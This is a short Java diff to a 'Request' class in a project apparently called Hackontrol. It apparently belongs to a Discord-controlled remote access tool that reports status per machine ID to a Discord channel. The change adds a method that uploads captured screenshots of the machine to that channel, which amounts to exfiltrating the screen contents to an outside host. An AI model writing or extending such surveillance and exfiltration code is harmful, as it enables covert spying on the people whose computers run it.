@@ -5,6 +5,8 @@ import com.fasterxml.jackson.databind.node.ObjectNode;
 import com.khopan.hackontrol.MachineId;
 
 import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
+import net.dv8tion.jda.api.requests.restaction.MessageCreateAction;
+import net.dv8tion.jda.api.utils.FileUpload;
 
 public class Request {
 	private final TextChannel channel;
@@ -23,10 +25,20 @@ public class Request {
 		this.request(RequestMode.STATUS_REPORT, node);
 	}
 
-	private void request(int requestMode, ObjectNode node) {
+	public void screenshotTaken(byte[] image) {
+		this.request(RequestMode.SCREENSHOT_TAKEN, this.mapper.createObjectNode(), FileUpload.fromData(image, "screenshot.png"));
+	}
+
+	private void request(int requestMode, ObjectNode node, FileUpload... files) {
 		node.put("requestMode", requestMode);
 		node.put("machineId", this.identifier.getIdentifier());
 		String message = node.toString();
-		this.channel.sendMessage(message).queue();
+		MessageCreateAction action = this.channel.sendMessage(message);
+
+		if(files != null && files.length > 0) {
+			action.addFiles(files);
+		}
+
+		action.queue();
 	}
 }
